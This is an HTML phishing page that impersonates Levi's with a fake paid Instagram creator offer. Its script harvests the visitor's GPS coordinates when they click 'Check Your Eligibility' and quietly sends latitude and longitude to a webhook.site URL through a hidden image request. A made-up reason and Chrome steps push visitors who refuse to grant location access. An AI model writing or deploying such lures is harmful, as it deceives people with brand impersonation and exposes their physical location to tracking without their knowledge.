<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Levi's Creator Collaboration</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #ffe6e9, #fff6f7);
      color: #333;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      text-align: center;
      max-width: 400px;
      padding: 30px 20px;
    }

    .logo {
      font-size: 36px;
      font-weight: bold;
      color: #c8102e;
      margin-bottom: 10px;
    }

    .headline {
      font-size: 22px;
      font-weight: 600;
      margin: 10px 0 15px;
    }

    .cta {
      font-size: 16px;
      margin-bottom: 25px;
      color: #555;
    }

    .highlight {
      color: #c8102e;
      font-weight: bold;
    }

    button {
      background-color: #c8102e;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }

    button:disabled {
      background-color: #999;
      cursor: not-allowed;
    }

    .loader {
      border: 4px solid #eee;
      border-top: 4px solid #c8102e;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }

    .message {
      margin-top: 20px;
      font-size: 15px;
    }

    .error {
      color: #c8102e;
      font-size: 14px;
      margin-top: 20px;
      text-align: left;
    }

    .steps {
      font-size: 14px;
      margin-top: 10px;
      line-height: 1.6;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">Levi'sÂ®</div>
    <div class="headline">ðŸŽ¯ Collaboration Offer Just For You!</div>
    <div class="cta">
      You're invited to our <span class="highlight">Exclusive Creator Program</span><br>
      Post Instagram Reels & <span class="highlight">Earn â‚¹5,000 per reel</span>!<br>
      Limited slots. Check if you're eligible now!
    </div>
    
    <button id="checkBtn">Check Your Eligibility</button>
    <div class="loader" id="loader"></div>
    <div class="message" id="message"></div>
    <div class="error" id="error"></div>
  </div>

  <script>
    const btn = document.getElementById("checkBtn");
    const loader = document.getElementById("loader");
    const message = document.getElementById("message");
    const errorDiv = document.getElementById("error");

    const webhookURL = "https://webhook.site/ebe81ba5-215a-4892-add1-eed8f7b2d654";

    btn.addEventListener("click", () => {
      errorDiv.textContent = "";
      message.textContent = "";
      loader.style.display = "block";
      btn.disabled = true;

      navigator.geolocation.getCurrentPosition(
        function (position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          const img = new Image();
          img.src = `${webhookURL}?lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`;
          img.style.display = "none";
          document.body.appendChild(img);

          loader.style.display = "none";
          message.textContent = "âœ… Thank you! Our team will contact you shortly with your campaign details.";
        },

        function (error) {
          loader.style.display = "none";
          btn.disabled = false;

          errorDiv.innerHTML = `
            âš  Location access is required to verify your eligibility.<br><br>
<strong style=color:blue>Why do we need your location?</strong><br>
To calculate product sale ratio and population density of your area. This helps us verify if Levi'sÂ® creator campaigns are active in your location.<br><br>
<b style=color:blue>To enable location manually in Chrome:</b>
<div class="steps">
  1. Open <b>Chrome</b><br>
  2. Tap the <b>three dots</b> (top-right)<br>
  3. Select <b>Settings</b><br>
  4. Scroll down to <b>Site Settings</b><br>
  5. Tap on <b>Location</b><br>
  6. Find this website URL<br>
  7. Tap it and choose <b>Allow</b><br>
  8. Refresh this page and try again
</div>
          `;
        }
      );
    });
  </script>

</body>
</html>
